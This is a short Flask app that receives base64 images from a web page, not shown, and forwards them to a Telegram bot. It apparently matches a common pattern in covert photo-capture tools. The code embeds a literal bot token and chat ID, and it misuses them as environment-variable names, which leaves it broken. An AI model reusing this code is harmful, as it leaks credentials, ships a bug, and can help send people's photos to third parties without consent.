import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

TOKEN = os.environ.get("8354228448:AAF_aDnYtuS__fqolYrWfAKnxh9DvdYCL_Q")
CHAT_ID = os.environ.get("7757061458")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_photo', methods=['POST'])
def send_photo():
    data = request.get_json()

    if not data or 'image' not in data:
        return jsonify({"success": False, "message": "No image"}), 400

    try:
        image_data = data['image'].split(',')[1]
        image_bytes = base64.b64decode(image_data)

        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

        files = {'photo': ('image.jpg', image_bytes)}
        payload = {'chat_id': CHAT_ID, 'caption': '📸 صورة من التطبيق'}

        r = requests.post(url, data=payload, files=files)

        return jsonify({"success": r.status_code == 200})

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500
